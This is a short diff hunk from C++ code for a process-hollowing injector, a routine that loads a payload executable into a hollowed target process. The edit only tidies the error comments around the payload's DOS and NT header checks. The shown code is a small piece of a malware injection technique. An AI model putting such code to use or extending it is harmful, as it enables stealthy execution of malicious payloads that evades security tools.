@@ -99,9 +99,9 @@ BOOL Injection::InjectViaProcessHollowing(const wchar_t* targetProcessPath, BYTE
 
     // Parse the payloadPE to get its ImageBase and EntryPoint, SizeOfImage
     PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)payloadPE;
-    if (payloadDosHeader->e_magic != IMAGE_DOS_SIGNATURE) { /* ... error ... */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; }
+    if (payloadDosHeader->e_magic != IMAGE_DOS_SIGNATURE) { /* error */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; } // Ensure no nested block comments
     PIMAGE_NT_HEADERS payloadNtHeaders = (PIMAGE_NT_HEADERS)(payloadPE + payloadDosHeader->e_lfanew);
-    if (payloadNtHeaders->Signature != IMAGE_NT_SIGNATURE) { /* ... error ... */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; }
+    if (payloadNtHeaders->Signature != IMAGE_NT_SIGNATURE) { /* error */ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; } // Ensure no nested block comments
 
     PVOID payloadImageBase = (PVOID)payloadNtHeaders->OptionalHeader.ImageBase;
     DWORD payloadEntryPointRVA = payloadNtHeaders->OptionalHeader.AddressOfEntryPoint;
